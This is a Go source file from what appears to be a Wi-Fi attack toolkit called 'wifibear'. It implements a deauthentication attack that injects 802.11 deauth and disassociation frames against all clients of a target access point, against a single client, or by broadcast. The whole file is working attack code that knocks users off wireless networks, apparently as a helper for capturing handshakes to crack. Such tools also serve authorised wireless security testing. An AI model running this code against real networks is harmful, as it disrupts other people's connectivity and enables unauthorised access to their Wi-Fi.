package attack

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket/layers"
	"github.com/wifibear/wifibear/internal/config"
	"github.com/wifibear/wifibear/internal/result"
	"github.com/wifibear/wifibear/pkg/wifi"
)

// DeauthAttack sends deauthentication frames using native gopacket injection.
// No aireplay-ng dependency required.
type DeauthAttack struct {
	cfg *config.Config
}

func NewDeauthAttack(cfg *config.Config) *DeauthAttack {
	return &DeauthAttack{cfg: cfg}
}

func (d *DeauthAttack) Name() string {
	return "Deauthentication"
}

func (d *DeauthAttack) Priority() int {
	return 0
}

func (d *DeauthAttack) CanAttack(target *wifi.Target) bool {
	return false // Helper attack, not standalone in chain
}

func (d *DeauthAttack) Run(ctx context.Context, target *wifi.Target, iface string) (*result.CrackResult, error) {
	return nil, fmt.Errorf("deauth is a helper attack, not standalone")
}

// DeauthTarget sends deauth frames to all clients of a target using native injection.
func (d *DeauthAttack) DeauthTarget(ctx context.Context, iface string, target *wifi.Target, count int) error {
	injector, err := NewInjector(iface)
	if err != nil {
		return fmt.Errorf("open injector: %w", err)
	}
	defer injector.Close()

	bssid := target.BSSID
	reason := layers.Dot11ReasonClass2FromNonAuth

	for i := 0; i < count; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Broadcast deauth
		_ = injector.SendBroadcastDeauth(bssid, reason)

		// Targeted deauth per client
		for _, client := range target.Clients {
			_ = injector.SendDeauth(bssid, client.MAC, reason)
			_ = injector.SendDisassociate(bssid, client.MAC, reason)
		}

		// Small delay between rounds to avoid overwhelming the adapter
		time.Sleep(50 * time.Millisecond)
	}

	return nil
}

// DeauthClient sends deauth frames targeting a specific client.
func (d *DeauthAttack) DeauthClient(ctx context.Context, iface string, bssid, clientMAC net.HardwareAddr, count int) error {
	injector, err := NewInjector(iface)
	if err != nil {
		return err
	}
	defer injector.Close()

	reason := layers.Dot11ReasonClass2FromNonAuth
	for i := 0; i < count; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		_ = injector.SendDeauth(bssid, clientMAC, reason)
		time.Sleep(50 * time.Millisecond)
	}
	return nil
}

// DeauthBroadcast sends broadcast deauth frames.
func (d *DeauthAttack) DeauthBroadcast(ctx context.Context, iface string, bssid net.HardwareAddr, count int) error {
	injector, err := NewInjector(iface)
	if err != nil {
		return err
	}
	defer injector.Close()

	reason := layers.Dot11ReasonClass2FromNonAuth
	for i := 0; i < count; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		_ = injector.SendBroadcastDeauth(bssid, reason)
		time.Sleep(50 * time.Millisecond)
	}
	return nil
}
